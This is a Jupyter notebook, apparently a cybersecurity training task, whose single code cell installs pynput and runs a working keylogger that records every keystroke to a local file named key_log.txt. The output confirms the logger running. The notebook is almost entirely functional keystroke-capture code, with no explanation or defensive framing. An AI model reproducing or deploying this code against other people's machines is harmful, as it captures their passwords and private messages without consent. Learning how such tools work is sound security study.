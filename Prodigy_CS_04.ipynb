{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee435c74-fa8e-441a-bc80-e64853b4cc40",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in c:\\users\\hewlett packard\\anaconda3\\lib\\site-packages (1.8.1)\n",
      "Requirement already satisfied: six in c:\\users\\hewlett packard\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "🔐 Keylogger is running (Press Ctrl+C to stop)...\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput\n",
    "from pynput import keyboard\n",
    "# File to log keystrokes\n",
    "LOG_FILE = \"key_log.txt\"\n",
    "\n",
    "# Function to handle key press events\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(LOG_FILE, \"a\") as f:\n",
    "            f.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        with open(LOG_FILE, \"a\") as f:\n",
    "            f.write(f\" [{key}] \")\n",
    "\n",
    "# Listener setup\n",
    "with keyboard.Listener(on_press=on_press) as listener:\n",
    "    print(\"🔐 Keylogger is running (Press Ctrl+C to stop)...\")\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f2d390e-4e90-49c6-ada4-ab338f0e7826",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
